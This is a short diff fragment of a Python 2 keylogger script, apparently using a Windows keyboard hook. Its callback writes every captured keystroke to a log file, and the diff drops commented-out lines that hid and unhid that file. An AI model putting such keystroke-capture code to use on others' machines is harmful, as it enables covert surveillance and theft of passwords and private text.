@@ -40,14 +40,11 @@ else:
 	print "TODO : Linux stuff"
 
 
-
 ## core
 def onKeyboardEvent(event):
-	#os.popen('attrib -h ' + file_log)
 	logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
 	chr(event.Ascii)
 	logging.log(10,chr(event.Ascii))
-	#os.popen('attrib +h ' + file_log)
 	return True
 
 ## create a hook manager object
